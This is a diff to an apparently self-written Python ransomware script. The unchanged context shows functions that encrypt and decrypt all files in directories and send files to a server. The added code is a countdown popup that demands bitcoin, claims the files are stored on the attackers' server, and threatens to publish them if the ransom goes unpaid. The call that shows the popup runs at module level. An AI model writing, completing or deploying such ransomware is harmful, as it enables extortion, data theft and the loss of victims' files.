@@ -3,10 +3,12 @@ from os.path import expanduser
 from cryptography.fernet import Fernet
 import base64
 import subprocess
-
+import time
+import signal
 
 # Home directory
 home = expanduser("~")
+
 
 
 def send_file_to_server(file_path):
@@ -35,7 +37,6 @@ def list_safe_directories(directory):
             result.append(os.path.join(root, directory))
 
     return result  # Return the list of directories
-
 
 # Method that retrieves all of the files in a directory and purposely does not include the ransomeware
 def get_files_in_dir(directory):
@@ -75,7 +76,6 @@ def encrypt_and_send_all_files(directory, key):
     for dir in dir_list:
         for file in get_files_in_dir(dir):
             file_path = os.path.join(dir, file)
-
             file_size = os.path.getsize(file_path)
             size_of_files += file_size
             number_of_files += 1
@@ -107,8 +107,29 @@ def decrypt_all_files(directory, key):
             decrypt_file(file_path, key)
 
 
-def display_popup(message):
-    subprocess.call(["zenity", "--info", "--text", message])
+def display_popup(duration):
+
+
+
+        start_time = time.time()
+        remaining_time = duration
+
+        while remaining_time > 0:
+                # Format the remaining time as minutes and seconds
+                minutes = int(remaining_time // 60)
+                seconds = int(remaining_time % 60)
+
+                        # Text to be displayed on the pop up
+                text = f"HAHAHAHA, all your files are encrypted and stored on our sever!\nIf you pay us in the next <b>{minutes:02d}:{seconds:02d}</b> we will decrypt your files and delete our copy.\nIf you do not pay us, the files will be published to the internet for all to see. \nTransfer: xxx btc to wallet_id"
+                # Show the dialog with the remaining time, keep refreshing the window.
+                popup = subprocess.Popen(["zenity", "--warning", "--text", text,"--width", "400", "--height", "200" ])
+
+                # Update the remaining time
+                elapsed_time = time.time() - start_time
+                remaining_time = duration - elapsed_time
+                time.sleep(1)
+                popup.send_signal(signal.SIGTERM)
+
 
 
 def main():
@@ -125,3 +146,4 @@ def main():
 
 
 # print(list_safe_directories(directory))
+display_popup(1000)
